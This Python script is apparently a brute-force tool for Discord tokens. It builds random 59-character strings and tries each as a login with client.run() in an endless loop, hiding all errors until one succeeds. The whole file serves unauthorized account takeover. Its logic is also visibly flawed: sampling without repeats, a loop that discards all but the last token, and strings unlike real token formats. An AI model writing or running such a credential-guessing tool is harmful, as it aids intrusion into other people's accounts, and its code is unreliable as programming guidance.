import discord
import random
def gen_token():
    uppercase_letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    lowercase_letters = uppercase_letters.lower()
    digits = "0123456789"
    symbols = "."
    upper, lower, nums, syms = True, True, True, True
    all = ""

    if upper :
        all += uppercase_letters
    if lower :
        all += lowercase_letters
    if nums :
        all += digits
    if syms :
        all += symbols

    lenght = 59
    amount = 30

    for x in range(amount):
        token = "".join(random.sample(all, lenght))
    return token

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)


while True :
    try :
        tok = gen_token()
        print("[*] Testing : ",tok)
        client.run(tok,log_handler=None)
        break
    except KeyboardInterrupt:
        print('Goodbye.')
        break
    except: 
        pass

